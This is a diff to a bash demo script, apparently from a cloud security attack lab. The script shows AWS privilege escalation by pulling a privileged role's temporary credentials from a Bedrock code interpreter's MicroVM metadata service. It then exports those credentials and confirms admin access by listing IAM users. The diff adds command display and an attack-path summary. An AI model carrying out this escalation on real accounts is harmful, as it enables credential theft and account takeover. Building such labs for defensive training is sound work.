@@ -5,7 +5,9 @@
 # InvokeCodeInterpreter can access an EXISTING code interpreter with a privileged
 # role and extract credentials from the MicroVM Metadata Service (MMDS)
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -13,6 +15,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-bedrock-002-to-admin-starting-user"
@@ -112,6 +132,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd aws sts get-caller-identity --query 'Arn' --output text
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -123,6 +144,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 4: Get account ID
 echo -e "${YELLOW}Step 4: Getting account ID${NC}"
+show_cmd aws sts get-caller-identity --query 'Account' --output text
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -130,6 +152,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 5: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 5: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd aws iam list-users --max-items 1
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -288,6 +311,7 @@ echo -e "${YELLOW}Step 9: Extracting credentials from code interpreter's MMDS${N
 echo "Running Python script to extract credentials..."
 echo ""
 
+show_attack_cmd python3 $PYTHON_SCRIPT $INTERPRETER_ID $AWS_REGION
 # Run the script and capture the output
 SCRIPT_OUTPUT=$(python3 $PYTHON_SCRIPT $INTERPRETER_ID $AWS_REGION 2>&1)
 
@@ -315,6 +339,7 @@ export AWS_SESSION_TOKEN=$EXTRACTED_SESSION_TOKEN
 export AWS_REGION=$AWS_REGION
 
 echo "Verifying identity with extracted credentials..."
+show_cmd aws sts get-caller-identity --query 'Arn' --output text
 ELEVATED_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $ELEVATED_IDENTITY"
 
@@ -330,6 +355,7 @@ echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
 echo "Attempting to list IAM users with extracted credentials..."
 echo ""
 
+show_cmd aws iam list-users --max-items 3 --output table
 if aws iam list-users --max-items 3 --output table; then
     echo ""
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
@@ -360,6 +386,19 @@ echo "- Only needs: StartCodeInterpreterSession + InvokeCodeInterpreter"
 echo "- Extracts temporary credentials from MicroVM metadata service"
 echo "- Credentials have full permissions of the execution role"
 
+echo -e "\n${YELLOW}Attack Path:${NC}"
+echo "  $STARTING_USER"
+echo "  → StartCodeInterpreterSession"
+echo "  → InvokeCodeInterpreter (extract MMDS credentials)"
+echo "  → Admin Access via $TARGET_ROLE credentials"
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
+
 echo -e "\n${YELLOW}Attack Artifacts:${NC}"
 echo "- Python script: $PYTHON_SCRIPT"
 echo "- Active code interpreter session: $INTERPRETER_ID"
@@ -371,3 +410,6 @@ echo -e "${RED}⚠ The code interpreter session remains active until cleaned up$
 echo -e "\n${YELLOW}To clean up and restore the original state:${NC}"
 echo "  ./cleanup_attack.sh"
 echo ""
+
+# Mark demo as active for plabs tracking
+touch "$(dirname "$0")/.demo_active"
